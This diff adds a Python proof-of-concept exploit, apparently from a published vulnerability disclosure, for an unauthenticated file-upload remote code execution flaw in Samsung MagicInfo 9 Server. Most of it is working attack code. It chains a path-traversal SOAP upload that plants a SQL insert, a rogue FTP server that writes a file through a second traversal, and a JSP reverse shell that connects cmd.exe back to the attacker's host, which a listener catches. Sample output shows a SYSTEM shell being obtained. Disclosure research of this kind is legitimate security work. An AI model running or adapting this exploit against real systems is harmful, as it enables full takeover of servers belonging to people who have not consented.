@@ -1,0 +1,277 @@
+#!/usr/bin/env python3
+"""
+Samsung MagicInfo MagicInfoWebAuthorClient ResponseUploadActivity TOCTOU File Upload Remote Code Execution Vulnerability
+Download: https://www.magicinfoservices.com/magicinfo-software?submissionGuid=4163dba5-9096-43b4-9ca0-27696e8b70b8
+File: MagicInfo 9 Server 21.1080.0 Setup.zip
+Release date: 5/8/2025
+SHA1: 9744711fe76e7531f128835bf83c9ae001069115
+Install guide: https://docs.samsungvx.com/docs/pages/viewpage.action?pageId=60034270
+Found by: Steven Seeley of Source Incite
+
+## Proof of Concept
+
+The following request will trigger the write, then we can just wait for the daily cron...
+
+```
+POST /MagicInfo/WSRMService HTTP/1.1
+Host: 192.168.18.136:7002
+Content-Type: multipart/related; start=1
+Content-Length: 1981
+
+--1337
+Content-Type: multipart/alternative
+Content-ID: 1
+
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope" xmlns:oper="http://www.samsung.com/wsrm/operationMsg">
+    <env:Header xmlns:addr="http://schemas.xmlsoap.org/ws/2004/08/addressing">
+        <addr:Action>http://samsung.com/sec/ws/2005/05/rm/Server/Download</addr:Action>
+        <addr:MessageID>1337</addr:MessageID>
+        <addr:RelatesTo></addr:RelatesTo>
+        <addr:To>https://www.zerodayinitiative.com/</addr:To>
+        <addr:From>
+            <addr:Address>https://www.zerodayinitiative.com</addr:Address>
+        </addr:From>
+        <addr:ReplyTo>
+            <addr:Address>https://www.zerodayinitiative.com/</addr:Address>
+        </addr:ReplyTo>
+        <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
+            <wsse:UsernameToken>
+                <wsse:Username></wsse:Username>
+            </wsse:UsernameToken>
+        </wsse:Security>
+    </env:Header>
+    <env:Body>
+        <oper:DOWNLOAD>
+            <oper:DOWNLOAD_TYPE>CONTENT</oper:DOWNLOAD_TYPE>
+            <oper:CONTENT_ID>validation/../PostgreSQL_checklist1.json</oper:CONTENT_ID>
+            <oper:CONTENT_LEN>1337</oper:CONTENT_LEN>
+            <oper:CONTENT_TYPE>1337</oper:CONTENT_TYPE>
+            <oper:MO_DOWNLOAD>1337</oper:MO_DOWNLOAD>
+            <oper:MO_SEQUENCE>
+                <oper:MO>
+                    <oper:MO_PATH>1337</oper:MO_PATH>
+                </oper:MO>
+            </oper:MO_SEQUENCE>
+        </oper:DOWNLOAD>
+    </env:Body>
+</env:Envelope>
+--1337
+Content-Type: multipart/alternative; boundary="1337"
+Content-ID: validation/../PostgreSQL_checklist1.json
+
+{"items" : [{"title" : "pwn","check_query" : "insert into mi_cms_code_file values (1337, 'PDF', 'JSP', 'Y');","resolve_query" : [],"expect" : "1337","description" : "lol"}]}
+```
+
+The other option is to run the `poc.py`:
+
+```
+researcher@universe:~/0d$ ./poc.py 192.168.18.136 192.168.18.137
+(+) performed the file drop. Let's sleep for 24hrs for the db injection and proceed...
+(+) FTP server running on 192.168.18.137:2121
+(+) starting handler on port 1337
+(+) checking for a shell drop...
+(+) WARNING, drops artefact to C:\MagicInfo Premium\tomcat\webapps\kpi\_\mz34dV9Z539oHmw5CP5XBpjWPRExwMep.jsp
+(+) connection from 192.168.18.136
+(+) pop thy shell!
+Microsoft Windows [Version 10.0.17763.7558]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\MagicInfo Premium\tomcat\bin>whoami
+whoami
+nt authority\system
+
+C:\MagicInfo Premium\tomcat\bin>
+```
+"""
+
+import os
+import sys
+import urllib3
+import logging
+import socket
+import time
+import random
+import string
+import requests
+from threading import Thread
+from pyftpdlib.log import config_logging
+from pyftpdlib.servers import FTPServer
+from pyftpdlib.handlers import FTPHandler
+from pyftpdlib.authorizers import DummyAuthorizer
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from telnetlib import Telnet
+from colorama import Fore, Style
+config_logging(level=logging.ERROR)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def generate_random_string(length):
+    characters = string.ascii_letters + string.digits
+    return ''.join(random.choice(characters) for _ in range(length))
+
+def upload_db_injection_primitive(t):
+    related = MIMEMultipart('related', "1337")
+    related.replace_header('Content-Type', f'multipart/related; boundary="{related.get_boundary()}"; start=1')
+    submission = MIMEText('multipart', 'alternative')
+    submission.set_payload("""<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope" xmlns:oper="http://www.samsung.com/wsrm/operationMsg">
+    <env:Header xmlns:addr="http://schemas.xmlsoap.org/ws/2004/08/addressing">
+        <addr:Action>http://samsung.com/sec/ws/2005/05/rm/Server/Download</addr:Action>
+        <addr:MessageID>1337</addr:MessageID>
+        <addr:RelatesTo></addr:RelatesTo>
+        <addr:To>https://srcincite.io/</addr:To>
+        <addr:From>
+            <addr:Address>https://srcincite.io/</addr:Address>
+        </addr:From>
+        <addr:ReplyTo>
+            <addr:Address>https://srcincite.io/</addr:Address>
+        </addr:ReplyTo>
+        <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
+            <wsse:UsernameToken>
+                <wsse:Username></wsse:Username>
+            </wsse:UsernameToken>
+        </wsse:Security>
+    </env:Header>
+    <env:Body>
+        <oper:DOWNLOAD>
+            <oper:DOWNLOAD_TYPE>CONTENT</oper:DOWNLOAD_TYPE>
+            <oper:CONTENT_ID>validation/../PostgreSQL_checklist.json</oper:CONTENT_ID><!-- hehe -->
+            <oper:CONTENT_LEN>1337</oper:CONTENT_LEN>
+            <oper:CONTENT_TYPE>1337</oper:CONTENT_TYPE>
+            <oper:MO_DOWNLOAD>1337</oper:MO_DOWNLOAD>
+            <oper:MO_SEQUENCE>
+                <oper:MO>
+                    <oper:MO_PATH>1337</oper:MO_PATH>
+                </oper:MO>
+            </oper:MO_SEQUENCE>
+        </oper:DOWNLOAD>
+    </env:Body>
+</env:Envelope>""")
+    submission.add_header('Content-ID', "1")
+    related.attach(submission)
+    document = MIMEText('multipart', 'alternative')
+    # We inject into mi_cms_code_file for us to trigger a directory traversal and gain RCE without having to restart.    
+    SQL = "insert into mi_cms_code_file values (1337, 'PDF', 'JSP', 'Y');"
+    document.set_payload("""{"items" : [{"title" : "pwn","check_query" : "%s","resolve_query" : [],"expect" : "1337","description" : "lol"}]}""" % SQL)
+    document.add_header('Content-ID', "validation/../PostgreSQL_checklist.json") # hehehe, TOCTOU traversal
+    related.attach(document)
+    body = related.as_string().split('\n\n', 1)[1]
+    headers = dict(related.items())
+    r = requests.post(f"https://{t}:7002/MagicInfo/WSRMService", data=body, headers=headers, verify=False)
+
+def get_jsp(ls, lp):
+    jsp = f"""<%@page import="java.lang.*"%>
+<%@page import="java.util.*"%>
+<%@page import="java.io.*"%>
+<%@page import="java.net.*"%>
+<%
+  class StreamConnector extends Thread
+  {{
+    InputStream sv;
+    OutputStream tp;
+    StreamConnector( InputStream sv, OutputStream tp )
+    {{
+      this.sv = sv;
+      this.tp = tp;
+    }}
+    public void run()
+    {{
+      BufferedReader za  = null;
+      BufferedWriter hjr = null;
+      try
+      {{
+        za  = new BufferedReader( new InputStreamReader( this.sv ) );
+        hjr = new BufferedWriter( new OutputStreamWriter( this.tp ) );
+        char buffer[] = new char[8192];
+        int length;
+        while( ( length = za.read( buffer, 0, buffer.length ) ) > 0 )
+        {{
+          hjr.write( buffer, 0, length );
+          hjr.flush();
+        }}
+      }} catch( Exception e ){{}}
+      try
+      {{
+        if( za != null )
+          za.close();
+        if( hjr != null )
+          hjr.close();
+      }} catch( Exception e ){{}}
+    }}
+  }}
+  try
+  {{
+    String ShellPath = new String("cmd.exe");
+    Socket socket = new Socket("{ls}", {lp});
+    Process process = Runtime.getRuntime().exec( ShellPath );
+    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
+    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
+  }} catch( Exception e ) {{}}
+%>"""
+    return jsp
+
+def handler(lp):
+    print(f"(+) starting handler on port {lp}")
+    t = Telnet()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0", lp))
+    s.listen(1)
+    conn, addr = s.accept()
+    print(f"(+) connection from {addr[0]}")
+    t.sock = conn
+    print(f"(+) {Fore.RED + Style.BRIGHT}pop thy shell!{Style.RESET_ALL}")
+    t.interact()
+
+def run_ftp(h, ftp_passwd):
+    authorizer = DummyAuthorizer()
+    authorizer.add_user("/../../../../tomcat/webapps/kpi/", ftp_passwd, "./", perm='elradfmw') 
+    handler = FTPHandler
+    handler.authorizer = authorizer
+    server = FTPServer((h, 2121), handler)
+    print(f"(+) FTP server running on {h}:2121")
+    server.serve_forever()
+
+def perform_ftp_write(t, h, ftp_passwd):
+    uri = f"https://{t}:7002/MagicInfo/servlet/FtpFileDownloadServlet"
+    p = {
+        # we could of also used the ftpDirectory here
+        "ftpLoginId": "/../../../../tomcat/webapps/kpi/",
+        "ftpPassword": ftp_passwd,
+        "ftpIp": h,
+        "ftpPort": "2121"
+    }
+    requests.post(uri, params=p, verify=False)
+
+def main():
+    if len(sys.argv) != 3:
+        print("(+) usage: %s <target> <connectback>" % sys.argv[0])
+        print("(+) eg: %s 192.168.18.136 192.168.18.137" % sys.argv[0])
+        sys.exit(1)
+    t = sys.argv[1]
+    h = sys.argv[2]
+    p = 1337
+    if ":" in sys.argv[2]:
+        p = int(sys.argv[2].split(":")[1])
+        h = sys.argv[2].split(":")[0]
+    upload_db_injection_primitive(sys.argv[1])
+    print("(+) performed the file drop. Let's sleep for 24hrs for the db injection and proceed...")
+    time.sleep(24 * 60 * 60)
+    ftp_passwd = generate_random_string(32)
+    handlerthr1 = Thread(target=run_ftp, args=[h, ftp_passwd])
+    handlerthr1.daemon = True
+    handlerthr1.start()
+    s = generate_random_string(32) + ".jsp"
+    with open(s, "w+") as bd:
+        bd.write(get_jsp(h, p))
+    perform_ftp_write(t, h, ftp_passwd)
+    handlerthr2 = Thread(target=handler, args=[p])
+    handlerthr2.start()
+    print("(+) checking for a shell drop...")
+    time.sleep(1.337)
+    os.remove(s)
+    print(f"{Fore.YELLOW + Style.BRIGHT}(+) WARNING, drops artefact to C:\\MagicInfo Premium\\tomcat\\webapps\\kpi\\_\\{s}{Style.RESET_ALL}")
+    requests.get(f"https://{t}:7002/kpi/_/{s}", verify=False)
+
+if __name__ == "__main__":
+    main()
